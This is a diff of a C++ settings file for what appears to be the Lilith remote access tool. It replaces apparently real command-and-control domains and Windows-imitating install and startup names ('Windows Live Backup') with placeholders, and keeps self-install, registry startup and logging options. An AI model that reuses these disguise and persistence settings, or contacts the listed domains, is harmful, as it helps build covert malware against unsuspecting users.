@@ -2,7 +2,7 @@
 
 #if _DEBUG
 std::string Settings::serverIP = "127.0.0.1";		//server ip
-int Settings::serverPort = 1111;	//server port
+int Settings::serverPort = 1337;	//server port
 
 std::string Settings::fileName = "lilithDEBUG.exe";					//file name
 std::string Settings::folderName = "lilithDEBUG folder";					//name of folder where file is located
@@ -17,12 +17,12 @@ bool Settings::logEvents = true;
 
 #else
 
-std::string Settings::serverIP = "oraclejavaseupdate.ddns.net";	/*windistupdate.ddns.net*/	//server ip
-int Settings::serverPort = 47128;	//server port
+std::string Settings::serverIP = "sample.ip.net";	/*windistupdate.ddns.net*/	//server ip
+int Settings::serverPort = 1337;	//server port
 
-std::string Settings::fileName = "winliveback.exe";					//file name
-std::string Settings::folderName = "Windows Live";					//name of folder where file is located
-std::string Settings::startupName = "Windows Live Backup";		//startup name in registry / taskmgr
+std::string Settings::fileName = "lilithRELEASE.exe";					//file name
+std::string Settings::folderName = "lilithRELEASE folder";					//name of folder where file is located
+std::string Settings::startupName = "lilithRELEASE startup";		//startup name in registry / taskmgr
 std::string Settings::logFileName = "log.txt";								//name of log file
 std::string Settings::installLocation = "APPDATA";			//install location (appdata, programdata etc)
 bool Settings::installSelf = true;				//specifies whether the program should install itself
